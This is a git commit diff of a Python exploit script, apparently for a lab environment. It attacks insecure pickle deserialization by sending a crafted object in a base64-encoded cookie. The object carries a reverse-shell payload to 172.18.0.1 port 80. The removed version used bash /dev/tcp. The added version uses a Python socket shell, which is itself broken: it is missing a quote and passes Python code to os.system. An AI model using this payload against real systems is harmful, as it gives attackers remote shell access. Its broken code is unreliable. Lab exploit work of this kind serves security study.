857e478005d7b4b46661277cd23abac705b5ddce
phith0n <phith0n.ph2f@gmail.com>
2017-05-02 02:07:43 +0800

    modify exploit

--- python/unpickle/exp.py
+++ python/unpickle/exp.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import requests
 import pickle
 import os
@@ -7,14 +7,14 @@ import base64
 
 class exp(object):
     def __reduce__(self):
-        s = """/bin/bash -i >& /dev/tcp/172.18.0.1/80 0>&1"""
+        s = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((172.18.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);"""
         return (os.system, (s,))
 
 
 e = exp()
 s = pickle.dumps(e)
 
-response = requests.get("http://172.18.0.2:9000/", cookies=dict(
-    user=base64.b64encode(s)
+response = requests.get("http://172.18.0.2:8000/", cookies=dict(
+    user=base64.b64encode(s).decode()
 ))
 print(response.content)
